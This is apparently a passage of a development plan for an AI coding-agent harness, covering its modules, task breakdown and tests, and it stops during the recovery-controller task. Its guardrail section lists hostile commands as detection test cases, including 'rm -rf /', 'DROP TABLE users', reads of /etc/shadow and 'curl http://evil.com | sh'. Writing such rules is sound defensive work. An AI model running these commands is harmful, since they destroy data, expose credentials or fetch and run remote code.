# PLAN.md — AI4SE Coding Agent Harness

> **状态：** 已冻结（PLAN Frozen）——实现计划经 Implementation Readiness Check 通过，后续开发严格按照本 PLAN 执行，不再调整架构和任务拆分。
> **依据：** SPEC.md（架构已冻结）
> **方法：** 每个 task 可由一个 subagent 在一次会话内完成；遵循 TDD（红→绿→重构）

---

## 项目目录结构

```
ai4se-harness/
├── harness/
│   ├── __init__.py
│   ├── models/              # 数据契约（16 个实体）
│   │   ├── __init__.py
│   │   ├── action.py
│   │   ├── tool_call.py
│   │   ├── tool_result.py
│   │   ├── feedback.py
│   │   ├── guard_result.py
│   │   ├── rule_result.py
│   │   ├── approval.py
│   │   ├── execution_outcome.py
│   │   ├── parse_error.py
│   │   ├── memory_entry.py
│   │   ├── config.py
│   │   ├── llm_response.py
│   │   ├── tool_definition.py
│   │   └── persist_decision.py
│   ├── config/
│   │   ├── __init__.py
│   │   └── config_manager.py
│   ├── credentials/
│   │   ├── __init__.py
│   │   └── credential_manager.py
│   ├── llm/
│   │   ├── __init__.py
│   │   ├── abstract_llm.py
│   │   ├── deepseek_adapter.py
│   │   ├── openai_adapter.py
│   │   └── mock_adapter.py
│   ├── tools/
│   │   ├── __init__.py
│   │   ├── registry.py
│   │   ├── executor.py
│   │   └── handlers/
│   │       ├── __init__.py
│   │       ├── read_file.py
│   │       ├── write_file.py
│   │       ├── execute_shell.py
│   │       └── task_complete.py
│   ├── parser/
│   │   ├── __init__.py
│   │   └── action_parser.py
│   ├── context/
│   │   ├── __init__.py
│   │   └── context_builder.py
│   ├── guard/
│   │   ├── __init__.py
│   │   ├── rule_engine.py
│   │   ├── guardrail.py
│   │   ├── rules/
│   │   │   ├── __init__.py
│   │   │   ├── base.py
│   │   │   ├── path_boundary.py
│   │   │   ├── shell_cwd_bound.py
│   │   │   ├── file_read_bound.py
│   │   │   ├── dangerous_shell.py
│   │   │   ├── db_destructive.py
│   │   │   └── network_exfil.py
│   │   └── approval/
│   │       ├── __init__.py
│   │       ├── base.py
│   │       ├── terminal.py
│   │       └── mock.py
│   ├── feedback/
│   │   ├── __init__.py
│   │   ├── pipeline.py
│   │   ├── fingerprint.py
│   │   ├── router.py
│   │   ├── generators/
│   │   │   ├── __init__.py
│   │   │   ├── base.py
│   │   │   ├── shell_gen.py
│   │   │   ├── test_gen.py
│   │   │   ├── lint_gen.py
│   │   │   ├── diff_gen.py
│   │   │   ├── guard_gen.py
│   │   │   ├── parser_gen.py
│   │   │   └── tool_exec_gen.py
│   │   ├── controllers/
│   │   │   ├── __init__.py
│   │   │   ├── recovery.py
│   │   │   └── governance.py
│   │   └── coordination.py
│   ├── memory/
│   │   ├── __init__.py
│   │   ├── store.py
│   │   ├── retriever.py
│   │   ├── policy.py
│   │   └── serializer.py
│   ├── loop/
│   │   ├── __init__.py
│   │   └── main_loop.py
│   └── cli/
│       ├── __init__.py
│       └── main.py
├── tests/
│   ├── __init__.py
│   ├── conftest.py
│   ├── test_models.py
│   ├── test_action_parser.py
│   ├── test_config_manager.py
│   ├── test_credential_manager.py
│   ├── test_llm_adapters.py
│   ├── test_tool_registry.py
│   ├── test_tool_executor.py
│   ├── test_context_builder.py
│   ├── test_rule_engine.py
│   ├── test_rules/
│   │   ├── __init__.py
│   │   ├── test_path_boundary.py
│   │   ├── test_shell_cwd_bound.py
│   │   ├── test_file_read_bound.py
│   │   ├── test_dangerous_shell.py
│   │   ├── test_db_destructive.py
│   │   └── test_network_exfil.py
│   ├── test_guardrail.py
│   ├── test_approval_providers.py
│   ├── test_shell_generator.py
│   ├── test_feedback_generators_phase2.py
│   ├── test_feedback_generators_phase3.py
│   ├── test_feedback_router.py
│   ├── test_fingerprint.py
│   ├── test_recovery_controller.py
│   ├── test_governance_controller.py
│   ├── test_coordination_layer.py
│   ├── test_feedback_pipeline.py
│   ├── test_memory_store.py
│   ├── test_memory_retriever.py
│   ├── test_memory_policy.py
│   ├── test_serializer.py
│   ├── test_main_loop.py
│   ├── test_cli.py
│   └── test_mechanism_demo.py
├── config.toml
├── pyproject.toml
├── Dockerfile
├── Makefile
├── README.md
└── .github/
    └── workflows/
        └── unit-test.yml
```

---

## 依赖图

```
Phase 0: Project Setup
    │
    ▼
Phase 1: Data Models (无依赖)
    │
    ├──────────────────────────────────────────────┐
    ▼                                              ▼
Phase 2a: Configuration Manager          Phase 2b: Credential Manager
    │                                              │
    ├──────────────────────┐                       │
    ▼                      ▼                       │
Phase 3: LLM Adapters      Phase 4: Tools          │
    │                      (Registry + Handlers)    │
    │                      │                       │
    │                      ├───────────────────────┘
    │                      ▼
    │              Phase 5: Action Parser
    │                      │
    │                      ▼
    │              Phase 6: Context Builder
    │                      │
    │                      ├───────────────────────┐
    │                      ▼                       ▼
    │              Phase 7a: Rule Engine    Phase 7b: HumanApprovalProvider
    │                      │                       │
    │                      ▼                       │
    │              Phase 7c: Guardrail             │
    │                      │                       │
    │                      ├───────────────────────┘
    │                      ▼
    │              Phase 8: Feedback Pipeline
    │               (Generators → Router → Controllers → Coordination)
    │                      │
    │                      ├───────────────────────┐
    │                      ▼                       ▼
    │              Phase 9: Memory Manager  Phase 10: Main Loop
    │                      │                       │
    │                      └───────────┬───────────┘
    │                                  ▼
    │                          Phase 11: CLI Entry Point
    │                                  │
    │                                  ▼
    │                          Phase 12: Integration & Mechanism Demo
    │                                  │
    │                                  ▼
    │                          Phase 13: Docker & CI/CD
```

---

## 并行执行策略

以下 task 组可并行执行（每个 task 在独立 worktree 中，由独立 subagent 完成）：

- **Wave 1（Phase 2 完成后）：** T3.1 (DeepSeekAdapter) ∥ T4.1 (ToolRegistry) ∥ T4.2 (Tool Handlers)；T3.1 完成后 → T3.2 (MockAdapter)
- **Wave 2（Phase 7 完成后）：** T8.1–T8.7 (7 个 Generator) 全部并行（各有独立测试文件，无冲突）
- **Wave 3（Phase 8 完成后）：** T9.1 (MemoryStore) ∥ T9.3 (MemoryPolicy) ∥ T9.4 (Serializer)；T9.1 完成后 → T9.2 (MemoryRetriever)
- **Wave 4（Phase 8+9 完成后）：** T10.1 (Main Loop) ∥ T12.1 (Mechanism Demo)

---

## Task 列表

### Phase 0: 项目骨架

---

#### T0.1: 初始化项目骨架

- **目标：** 创建 Python 项目骨架，包含目录结构、pyproject.toml、Makefile 和 conftest.py
- **涉及文件：**
  - `pyproject.toml` — 项目元数据、依赖（httpx, tomli, keyring, pytest, pytest-asyncio, mypy）
  - `Makefile` — `make test`、`make lint`、`make typecheck` 目标
  - `harness/__init__.py` — 空
  - `tests/__init__.py` — 空
  - `tests/conftest.py` — 共享 fixture（tmp_workspace、sample_config 等）
  - `config.toml` — 默认配置模板
- **验证步骤：**
  1. `pip install -e .` 成功
  2. `make test` 运行（即使 0 个测试）
  3. `make lint` 和 `make typecheck` 可执行
  4. `python -c "import harness"` 成功
- **依赖：** 无
- **可并行：** 否（Phase 0 唯一 task）

---

### Phase 1: 数据模型

---

#### T1.1: 实现所有数据模型（16 个实体）

- **目标：** 按 SPEC §6 定义所有数据契约，使用 `@dataclass(frozen=True)` 实现不可变性
- **涉及文件：**
  - `harness/models/__init__.py` — 统一导出
  - `harness/models/action.py` — Action（tool_name, parameters, raw_response）
  - `harness/models/tool_call.py` — ToolCall（id, name, arguments）
  - `harness/models/tool_result.py` — ToolResult（success, exit_code, stdout, stderr, error, duration_ms）
  - `harness/models/feedback.py` — Feedback（fingerprint, source, severity, payload, metadata, round, timestamp, tool_call, correlation_id）+ FeedbackMetadata（provider, latency_ms, retry_count, trace_id）+ FeedbackSource 枚举 + Severity 枚举
  - `harness/models/guard_result.py` — GuardResult（verdict, rule_results, approval_request）+ GuardVerdict 枚举
  - `harness/models/rule_result.py` — RuleResult（rule_name, verdict, reason, evidence）+ RuleVerdict 枚举
  - `harness/models/approval.py` — ApprovalRequest（description, evidence, timestamp）+ ApprovalResult（result）+ ApprovalOutcome 枚举
  - `harness/models/execution_outcome.py` — ExecutionOutcome（Union[ToolResult, GuardResult, ParseError]）
  - `harness/models/parse_error.py` — ParseError（error_type, raw_response, detail）
  - `harness/models/memory_entry.py` — MemoryEntry（id, category, content, created_at, source_round）
  - `harness/models/config.py` — Config（frozen, 所有配置字段）
  - `harness/models/llm_response.py` — LLMResponse（content, tool_calls, finish_reason, usage）
  - `harness/models/tool_definition.py` — ToolDefinition（name, description, parameters）
  - `harness/models/persist_decision.py` — PersistDecision（decision, reason, category）+ PersistOutcome 枚举
- **验证步骤：**
  1. 所有 dataclass 可实例化
  2. frozen=True 禁止修改
  3. 枚举值正确
  4. `from harness.models import *` 导入所有实体
  5. 编写 `tests/test_models.py` 验证每个实体的构造和不可变性
- **依赖：** T0.1
- **可并行：** 否（Phase 1 唯一 task，所有后续 task 依赖它）

---

#### 里程碑 M1: Data Contract Freeze（数据契约冻结） ✅ 已完成

> **完成日期：** 2026-07-08
> **审查结果：** 全部 16 个 dataclass + 6 个 Enum + 6 个 Config 子类通过 SPEC §6 逐项验证。
> - 58/58 测试通过
> - mypy: 0 错误 (16 个源文件)
> - ruff: 0 错误
> - 28 个符号从 `harness.models` 正确导出
> - 所有字段名、类型、默认值、`frozen=True` 约束与 SPEC §6 一致
> **状态：Data Contract Frozen**

---

### Phase 2: 配置与凭据

---

#### T2.1: Configuration Manager

- **目标：** 实现 TOML 配置加载器，生成不可变 Config 对象（SPEC §3.8）
- **涉及文件：**
  - `harness/config/__init__.py`
  - `harness/config/config_manager.py` — `load_config(path) → Config`，验证必填字段，处理缺失/无效/未知键
  - `tests/test_config_manager.py` — 测试：有效 TOML、缺失必填键、无效值类型、未知键警告、API Key 排除
- **实现要点：**
  - 使用 `tomllib`（3.11+）或 `tomli` 解析
  - 验证 `workspace.root` 和 `llm.provider` 为必填项
  - 应用默认值：`max_iterations=10`、`timeout_seconds=300`、`convergence_threshold=3`、`hitl_timeout_seconds=120`
  - 未知键记录警告（logging.warning），不阻止启动
  - Config 对象创建后不可变（frozen dataclass）
- **验证步骤：**
  1. 有效 TOML → 返回 Config（TDD：先写失败测试）
  2. 缺失 `workspace.root` → 清晰错误消息
  3. 无效值类型 → 清晰错误消息含键名和期望类型
  4. 未知键 → 警告日志
  5. Config 对象中无 `api_key` 字段
- **依赖：** T1.1

---

#### T2.2: Credential Manager

- **目标：** 实现跨平台 API Key 安全存储（SPEC §7.1）
- **涉及文件：**
  - `harness/credentials/__init__.py`
  - `harness/credentials/credential_manager.py` — `store(provider, key)`、`retrieve(provider)`、`clear(provider)`、`status(provider)`、`sanitize(text)`
  - `tests/test_credential_manager.py` — 测试：存储/检索/清除/状态、脱敏、隐藏输入（使用 mock）
- **实现要点：**
  - 主存储：`keyring` 库（Windows Credential Manager / macOS Keychain / Linux Secret Service）
  - 回退存储：`cryptography` 库加密文件（`.harness-credentials.enc`）
  - 隐藏输入：`getpass.getpass()`
  - 脱敏：`sanitize()` 在日志输出前替换 Key 为 `***`
  - 状态显示：报告"已配置"或"未配置"，不回显明文
  - 首次运行：检测无凭据 → 提示输入
- **验证步骤：**
  1. 存储 Key → 检索返回相同 Key（TDD：先红）
  2. 清除 Key → 检索返回 None
  3. 状态不显示 Key 明文
  4. `sanitize("sk-abc123")` 不包含 "sk-abc123"
  5. 隐藏输入测试（mock getpass）
- **依赖：** T1.1

---

### Phase 3: LLM 适配器层

---

#### T3.1: AbstractLLM + DeepSeekAdapter + OpenAIAdapter

- **目标：** 实现 LLM 抽象接口及 DeepSeek/OpenAI 适配器（SPEC §3.2）
- **涉及文件：**
  - `harness/llm/__init__.py`
  - `harness/llm/abstract_llm.py` — `AbstractLLM` ABC，定义 `async call(messages) → LLMResponse`
  - `harness/llm/deepseek_adapter.py` — `DeepSeekAdapter(AbstractLLM)`，对接 DeepSeek API（OpenAI 兼容格式）
  - `harness/llm/openai_adapter.py` — `OpenAIAdapter(AbstractLLM)`，对接 OpenAI API
  - `tests/test_llm_adapters.py` — 测试 MockAdapter（T3.2 完成后补充）
- **实现要点：**
  - 使用 `httpx.AsyncClient` 进行 HTTP 调用
  - 重试逻辑：3 次指数退避（1s, 2s, 4s），仅对可重试错误（429, 5xx, 网络超时）
  - 不可重试错误（401, 403, 400）→ 抛出 `LLMFatalError`
  - 重试不消耗 Main Loop 迭代计数（适配器内部处理）
  - 适配器不修改消息列表、不缓存、不存储
- **验证步骤：**
  1. `DeepSeekAdapter` 可实例化（需要 API Key）
  2. 重试逻辑的单元测试（mock httpx 返回 429 → 200）
  3. 不可重试错误的单元测试（mock httpx 返回 401 → LLMFatalError）
  4. 指数退避时序验证
- **依赖：** T1.1, T2.1

---

#### T3.2: MockAdapter

- **目标：** 实现返回预编程响应的 Mock LLM 适配器（SPEC §3.2, US-6）
- **涉及文件：**
  - `harness/llm/mock_adapter.py` — `MockAdapter(AbstractLLM)`
  - `tests/test_llm_adapters.py` — 补充 MockAdapter 单元测试
- **实现要点：**
  - 接受预设响应列表：`MockAdapter(responses=[LLMResponse(...), LLMResponse(...)])`
  - 按顺序返回，耗尽后返回最后一个响应
  - 支持场景注入：有效 ToolCall、格式错误 JSON、未知工具名、纯文本、空响应
  - 支持 `call_count` 属性追踪调用次数
  - 无网络访问，无真实 LLM 调用
- **验证步骤：**
  1. 返回预设文本响应（TDD：先写失败测试）
  2. 返回预设 ToolCall 响应
  3. 返回格式错误响应（Malformed 场景）
  4. 返回未知工具名响应（UnknownTool 场景）
  5. `call_count` 正确递增
  6. 无网络请求
- **依赖：** T1.1, T3.1（需要 AbstractLLM 定义）
- **可并行：** 否——必须在 T3.1 完成后串行执行

---

### Phase 4: 工具层

---

#### T4.1: ToolRegistry + ToolDefinition

- **目标：** 实现工具注册表，支持静态注册和查询（SPEC §3.3.1）
- **涉及文件：**
  - `harness/tools/__init__.py`
  - `harness/tools/registry.py` — `ToolRegistry` 类
  - `harness/tools/definitions.py` — 四个内置工具的 JSON Schema 定义
  - `tests/test_tool_registry.py`
- **实现要点：**
  - 启动时注册 4 个内置工具：`read_file`、`write_file`、`execute_shell`、`task_complete`
  - `is_registered(name) → bool`
  - `get_tool(name) → ToolDefinition`
  - `get_all_tools() → list[ToolDefinition]`
  - 初始化后不可变（无动态注册/卸载）
  - 配置 `tools.enabled` 控制启用哪些工具
- **验证步骤：**
  1. 注册内置工具 → 4 个工具已注册（TDD：先红）
  2. `is_registered("read_file")` → True
  3. `is_registered("nonexistent")` → False
  4. `get_tool("read_file")` → 返回含 name, description, parameters 的 ToolDefinition
  5. `get_tool("nonexistent")` → KeyError
  6. `get_all_tools()` → 返回 4 个 ToolDefinition
  7. 配置禁用某工具 → 该工具不在注册表中
- **依赖：** T1.1

---

#### T4.2: Tool Handlers (read_file, write_file, execute_shell, task_complete)

- **目标：** 实现四个工具处理器（SPEC §3.5）
- **涉及文件：**
  - `harness/tools/handlers/__init__.py`
  - `harness/tools/handlers/read_file.py` — 读取文件，错误处理 FILE_NOT_FOUND / PERMISSION_DENIED
  - `harness/tools/handlers/write_file.py` — 写入文件
  - `harness/tools/handlers/execute_shell.py` — 执行 Shell 命令，支持超时，捕获 exit_code/stdout/stderr
  - `harness/tools/handlers/task_complete.py` — 返回成功 ToolResult（停机信号由 Main Loop 处理）
- **实现要点：**
  - 所有路径相对于工作区根目录解析
  - Shell 命令以可配置超时执行（默认 60s）
  - Shell 命令继承工作区根目录作为工作目录
  - 所有失败通过 ToolResult 报告（success=False + error 码），不抛出异常
  - 文件 I/O 超时默认 10s
- **验证步骤：**
  1. `read_file` 读取工作区文件 → 返回内容（TDD：先红）
  2. `read_file` 读取不存在文件 → success=False, error="FILE_NOT_FOUND"
  3. `write_file` 写入工作区文件 → 文件存在且内容正确
  4. `execute_shell` 执行 `echo hello` → exit_code=0, stdout="hello"
  5. `execute_shell` 执行失败命令 → exit_code≠0, stderr 非空
  6. `execute_shell` 超时命令 → success=False, error="TIMEOUT"
  7. `task_complete` → success=True
- **依赖：** T1.1
- **测试覆盖：** 集成测试由 `tests/test_tool_executor.py`（T4.3）覆盖，不设独立测试文件

---

#### T4.3: Tool Executor

- **目标：** 实现工具执行器，根据 tool_name 分发到对应 handler（SPEC §3.5）
- **涉及文件：**
  - `harness/tools/executor.py` — `ToolExecutor` 类
  - `tests/test_tool_executor.py`
- **实现要点：**
  - 接收 Action 和 ToolRegistry，分发到对应 handler
  - 不评估安全性——仅执行已批准的动作
  - 统一返回 ToolResult
  - 不在 Executor 中做决策
- **验证步骤：**
  1. 执行 `read_file` Action → 调用对应 handler（TDD：先红）
  2. 执行 `execute_shell` Action → 调用对应 handler
  3. 未知工具名 → 抛出 KeyError（由 ActionParser 守卫，Executor 不处理）
- **依赖：** T1.1, T4.1, T4.2

---

### Phase 5: Action Parser

---

#### T5.1: Action Parser

- **目标：** 实现 LLM 响应的四分类解析器（SPEC §3.3）
- **涉及文件：**
  - `harness/parser/__init__.py`
  - `harness/parser/action_parser.py` — `parse(llm_response, registry) → TextOnly | Action | ParseError`
  - `tests/test_action_parser.py`
- **实现要点：**
  - 四分类：TextOnly、ToolCall(known)、ToolCall(unknown)、Malformed
  - 分类逻辑是纯函数，无副作用
  - Malformed 条件：JSON 解析失败、缺失必填参数、空响应（无 content 且无 tool_calls）
  - `task_complete` 被解析为 ToolCall(known)，后续由 Main Loop 识别为停机信号
  - 多个 tool_calls：依次解析，每个独立分类
- **验证步骤：**
  1. 纯文本响应 → TextOnly（TDD：先红）
  2. 已知工具名 → 返回 Action 对象
  3. 未知工具名 → 返回 ParseError(error_type="UNKNOWN_TOOL")
  4. 无效 JSON tool_calls → 返回 ParseError(error_type="MALFORMED_CALL")
  5. 缺失必填参数 → 返回 ParseError(error_type="MALFORMED_CALL")
  6. 空响应 → 返回 ParseError
  7. `task_complete` → 返回 Action(tool_name="task_complete")
  8. 多个 tool_calls → 每个独立解析
- **依赖：** T1.1, T4.1

---

### Phase 6: Context Builder

---

#### T6.1: Context Builder

- **目标：** 实现上下文组装器（SPEC §3.1.1）
- **涉及文件：**
  - `harness/context/__init__.py`
  - `harness/context/context_builder.py` — `build(system_prompt, tool_definitions, memory_entries, message_history, user_task) → list[dict]`
  - `tests/test_context_builder.py`
- **实现要点：**
  - 纯组装器——不决定"取什么"，只决定"如何组装"
  - 不持有消息历史——由 Main Loop 传入
  - 不修改任何输入——纯函数
  - 输出格式：`[{"role": "system", "content": ...}, {"role": "user", "content": ...}, ...]`
  - 记忆条目格式化后追加到系统消息
  - 首轮迭代将用户任务作为最后一条用户消息
- **验证步骤：**
  1. 首轮迭代 → 消息列表包含 system + user task（TDD：先红）
  2. 非首轮迭代 → 消息列表包含 system + history + 最后一条 LLM 响应
  3. 记忆条目 → 追加到系统消息中
  4. 工具定义 → 包含在系统消息中
  5. ContextBuilder 不修改输入参数（纯函数验证）
- **依赖：** T1.1, T4.1

---

### Phase 7: Guard + Rule Engine + HumanApprovalProvider

---

#### T7.1: Rule Base + 6 Rules

- **目标：** 实现 Rule 抽象接口和 6 条内置规则（SPEC §3.4）
- **涉及文件：**
  - `harness/guard/__init__.py`
  - `harness/guard/rules/__init__.py`
  - `harness/guard/rules/base.py` — `Rule` ABC，定义 `evaluate(action) → RuleResult`
  - `harness/guard/rules/path_boundary.py` — `PathBoundaryRule(priority=100)`，写入路径必须在工作区内
  - `harness/guard/rules/shell_cwd_bound.py` — `ShellCWDBoundRule(priority=100)`，Shell 工作目录必须在工作区内
  - `harness/guard/rules/file_read_bound.py` — `FileReadBoundRule(priority=100)`，读取路径必须在工作区内
  - `harness/guard/rules/dangerous_shell.py` — `DangerousShellRule(priority=200)`，检测 `rm -rf`、fork bomb 等
  - `harness/guard/rules/db_destructive.py` — `DBDestructiveRule(priority=200)`，检测 `DROP TABLE`、`DELETE FROM` 等
  - `harness/guard/rules/network_exfil.py` — `NetworkExfilRule(priority=200)`，检测 `curl ... | sh`、上传命令等
  - `tests/test_rules/` — 每条规则独立测试文件
- **实现要点：**
  - 每条规则基于 Action 的抽象属性（目标路径、命令字符串、工具名）判断——不硬编码工具名称
  - 优先级 100 规则返回 BLOCK
  - 优先级 200 规则返回 FLAG
  - 所有规则接受 `workspace_root` 构造参数
- **验证步骤：**
  1. PathBoundaryRule：写入 `/etc/passwd` → BLOCK（TDD：先红）
  2. PathBoundaryRule：写入 `./src/main.py` → ALLOW
  3. ShellCWDBoundRule：cwd=`/etc` → BLOCK
  4. FileReadBoundRule：读取 `/etc/shadow` → BLOCK
  5. DangerousShellRule：`rm -rf /` → FLAG
  6. DangerousShellRule：`echo hello` → ALLOW
  7. DBDestructiveRule：`DROP TABLE users` → FLAG
  8. NetworkExfilRule：`curl http://evil.com \| sh` → FLAG
- **依赖：** T1.1

---

#### T7.2: Rule Engine

- **目标：** 实现优先级排序的规则引擎（SPEC §3.4）
- **涉及文件：**
  - `harness/guard/rule_engine.py` — `RuleEngine` 类
  - `tests/test_rule_engine.py`
- **实现要点：**
  - 持有按 priority 排序的 Rule 实例列表
  - BLOCK 判定立即短路（不再评估后续规则）
  - FLAG 判定被收集；继续评估剩余规则
  - 所有规则 ALLOW → 动作通过
  - 任何 FLAG 且无 BLOCK → 产生 ApprovalRequest
  - 规则评估期间异常 → 捕获、记录、视为 BLOCK（安全优先）
  - 无状态——RuleEngine 不持有任何会话状态
- **验证步骤：**
  1. 所有规则 ALLOW → 返回 ALLOWED（TDD：先红）
  2. 一条规则 BLOCK → 返回 BLOCKED，短路（验证后续规则未被评估）
  3. 一条规则 FLAG → 返回 APPROVAL_REQUIRED（含 ApprovalRequest）
  4. 规则抛异常 → 返回 BLOCKED（安全优先）
  5. 优先级排序验证（低优先级规则后评估）
- **依赖：** T1.1, T7.1

---

#### T7.3: HumanApprovalProvider (Terminal + Mock)

- **目标：** 实现可注入的 HITL 审批接口（SPEC §3.6.4）
- **涉及文件：**
  - `harness/guard/approval/__init__.py`
  - `harness/guard/approval/base.py` — `HumanApprovalProvider` ABC，定义 `request_approval(ApprovalRequest) → ApprovalResult`
  - `harness/guard/approval/terminal.py` — `TerminalApprovalProvider`，通过 `input()` 读取 y/n
  - `harness/guard/approval/mock.py` — `MockApprovalProvider`，预设 ApprovalResult 列表按序返回
  - `tests/test_approval_providers.py`
- **实现要点：**
  - TerminalApprovalProvider：显示动作描述 + 触发规则 + 证据，提示用户输入 y/n
  - MockApprovalProvider：接受 `[ApprovalResult(APPROVED), ApprovalResult(REJECTED), ...]`，按顺序返回
  - Provider 不持有状态——每次调用独立
  - 超时由 Main Loop 管理，Provider 仅负责 I/O
- **验证步骤：**
  1. MockApprovalProvider 返回 APPROVED（TDD：先红）
  2. MockApprovalProvider 返回 REJECTED
  3. MockApprovalProvider 按序返回多个结果
  4. TerminalApprovalProvider 可用 mock input 测试
- **依赖：** T1.1

---

#### T7.4: Guardrail

- **目标：** 实现 Guardrail 门面，组合 RuleEngine + HumanApprovalProvider（SPEC §3.4）
- **涉及文件：**
  - `harness/guard/guardrail.py` — `Guardrail` 类，`evaluate(action) → GuardResult`
  - `tests/test_guardrail.py`
- **实现要点：**
  - 组合 RuleEngine 评估动作
  - RuleEngine 返回 ALLOWED → GuardResult(ALLOWED)
  - RuleEngine 返回 BLOCKED → GuardResult(BLOCKED) + 审计日志
  - RuleEngine 返回 APPROVAL_REQUIRED → GuardResult(APPROVAL_REQUIRED) + ApprovalRequest
  - Guardrail 不执行审批交互——仅产生 GuardResult
  - 所有动作（包括 read_file、task_complete）经过 Guardrail
- **验证步骤：**
  1. 安全动作 → GuardResult(ALLOWED)（TDD：先红）
  2. 越界动作 → GuardResult(BLOCKED)
  3. 危险动作 → GuardResult(APPROVAL_REQUIRED) + ApprovalRequest
  4. task_complete → 经过 Guardrail（审计日志）
- **依赖：** T1.1, T7.2, T7.3

---

### Phase 8: Feedback Pipeline

---

#### T8.1: FeedbackGenerator Base + ShellGen

- **目标：** 实现 FeedbackGenerator 抽象基类和 ShellGen（SPEC §3.6.1）
- **涉及文件：**
  - `harness/feedback/__init__.py`
  - `harness/feedback/generators/__init__.py`
  - `harness/feedback/generators/base.py` — `FeedbackGenerator` ABC，定义 `generate(raw_data) → Feedback`
  - `harness/feedback/generators/shell_gen.py` — `ShellGen`，解析 Shell 执行的 ToolResult → Feedback
  - `tests/test_shell_generator.py` — ShellGen 独立测试
- **实现要点：**
  - ShellGen：从 ToolResult 提取 exit_code、stdout、stderr、command
  - severity：exit_code=0 → INFO，exit_code≠0 → ERROR
  - 生成器不生成 fingerprint（由 FingerprintStrategy 统一生成）
  - 生成器不路由、不做决策
- **验证步骤：**
  1. 成功 Shell → Feedback(source=SHELL, severity=INFO)（TDD：先红）
  2. 失败 Shell → Feedback(source=SHELL, severity=ERROR)
  3. Shell 超时 → Feedback(source=SHELL, severity=ERROR)
- **依赖：** T1.1

---

#### T8.2: TestGen + LintGen + DiffGen

- **目标：** 实现测试、Lint、Diff 反馈生成器（SPEC §3.6.1）
- **涉及文件：**
  - `harness/feedback/generators/test_gen.py` — `TestGen`，解析测试执行的 ToolResult → Feedback
  - `harness/feedback/generators/lint_gen.py` — `LintGen`，解析 Lint 执行的 ToolResult → Feedback
  - `harness/feedback/generators/diff_gen.py` — `DiffGen`，解析文件写入的 ToolResult → Feedback
  - `tests/test_feedback_generators_phase2.py` — TestGen/LintGen/DiffGen 独立测试
- **实现要点：**
  - TestGen：解析 pytest 输出（passed/failed/total/failures[]）
  - LintGen：解析 flake8/mypy 输出（errors[], warnings[]）
  - DiffGen：解析 git diff 输出（patch, files_changed, additions, deletions）
  - 阶段 2 和 3 的 Generator 面向标准工具
- **验证步骤：**
  1. TestGen：pytest 全部通过 → Feedback(source=TEST, severity=INFO)（TDD：先红）
  2. TestGen：pytest 有失败 → Feedback(source=TEST, severity=ERROR)
  3. LintGen：flake8 无错误 → Feedback(source=LINT, severity=INFO)
  4. LintGen：flake8 有错误 → Feedback(source=LINT, severity=WARNING)
  5. DiffGen：文件写入成功 → Feedback(source=DIFF, severity=INFO)
- **依赖：** T1.1, T8.1

---

#### T8.3: GuardGen + ParserGen + ToolExecGen

- **目标：** 实现 Guardrail、Parser、Tool Executor 反馈生成器（SPEC §3.6.1）
- **涉及文件：**
  - `harness/feedback/generators/guard_gen.py` — `GuardGen`，解析 GuardResult → Feedback
  - `harness/feedback/generators/parser_gen.py` — `ParserGen`，解析 ParseError → Feedback
  - `harness/feedback/generators/tool_exec_gen.py` — `ToolExecGen`，解析 I/O 错误的 ToolResult → Feedback
  - `tests/test_feedback_generators_phase3.py` — GuardGen/ParserGen/ToolExecGen 独立测试
- **实现要点：**
  - GuardGen：BLOCKED → CRITICAL；APPROVAL_REQUIRED → WARNING
  - ParserGen：UNKNOWN_TOOL → WARNING；MALFORMED_CALL → ERROR
  - ToolExecGen：FILE_NOT_FOUND/PERMISSION_DENIED → ERROR
- **验证步骤：**
  1. GuardGen：BLOCKED → Feedback(source=GUARDRAIL, severity=CRITICAL)（TDD：先红）
  2. GuardGen：APPROVAL_REQUIRED → Feedback(source=GUARDRAIL, severity=WARNING)
  3. ParserGen：UNKNOWN_TOOL → Feedback(source=PARSER, severity=WARNING)
  4. ParserGen：MALFORMED_CALL → Feedback(source=PARSER, severity=ERROR)
  5. ToolExecGen：FILE_NOT_FOUND → Feedback(source=TOOL_EXECUTOR, severity=ERROR)
- **依赖：** T1.1, T8.1

---

#### T8.4: FingerprintStrategy

- **目标：** 实现集中的 fingerprint 生成策略（SPEC §3.6.1）
- **涉及文件：**
  - `harness/feedback/fingerprint.py` — `FingerprintStrategy`，`generate(feedback) → str`
  - `tests/test_fingerprint.py`
- **实现要点：**
  - 生成规则：`hash(tool_name + error_type + key_params)`
  - 相同错误 → 相同 fingerprint
  - 不同错误 → 不同 fingerprint
  - key_params 由 feedback source 决定（Shell：命令前 N 字符；Test：失败用例名；等）
  - 使用 SHA256 取前 16 字符
- **验证步骤：**
  1. 相同错误两次 → 相同 fingerprint（TDD：先红）
  2. 不同错误 → 不同 fingerprint
  3. 相同命令不同参数 → 不同 fingerprint（key_params 包含关键参数）
  4. 确定性：相同输入总是产生相同输出
- **依赖：** T1.1

---

#### T8.5: FeedbackRouter

- **目标：** 实现无状态反馈路由器（SPEC §3.6.2）
- **涉及文件：**
  - `harness/feedback/router.py` — `FeedbackRouter`，`route(feedback) → Track`
  - `tests/test_feedback_router.py`
- **实现要点：**
  - 11 条路由规则（source + severity → RECOVERY | GOVERNANCE）
  - GUARDRAIL + (ERROR|CRITICAL) → GOVERNANCE
  - GUARDRAIL + (INFO|WARNING) → RECOVERY（仅审计）
  - PERMISSION → GOVERNANCE
  - SYSTEM + CRITICAL → GOVERNANCE
  - 其他所有 → RECOVERY
  - 无状态——纯函数
- **验证步骤：**
  1. SHELL + ERROR → RECOVERY（TDD：先红）
  2. GUARDRAIL + CRITICAL → GOVERNANCE
  3. GUARDRAIL + INFO → RECOVERY
  4. PERMISSION + WARNING → GOVERNANCE
  5. SYSTEM + CRITICAL → GOVERNANCE
  6. SYSTEM + INFO → RECOVERY
- **依赖：** T1.1

---

#### T8.6: RecoveryController

- **目标：** 实现恢复控制器——表驱动状态机（SPEC §3.6.3）
- **涉及文件：**
  - `harness/feedback/controllers/__init__.py`
  - `harness/feedback/controllers/recovery.py` — `RecoveryController`，表驱动 SM
  - `tests/test_recovery_controller.py`
- **实现要点：**
  - 5 个状态：IDLE、CONTINUE、RETRY、REPLAN、WAIT
  - 8 条转换规则，以表格形式定义（数据结构，非 if-else 链）
  - SAME_ERROR 通过 fingerprint 匹配判定
  - RETRY_THRESHOLD = 连续 3 次相同 fingerprint
  - REPLAN → SAME_ERROR → UPGRADE（升级到 Governance）
- **验证步骤：**
  1. IDLE + FEEDBACK_RECEIVED → CONTINUE（TDD：先红）
  2. CONTINUE + SAME_ERROR → RETRY
  3. RETRY + SAME_ERROR → RETRY（计数器递增）
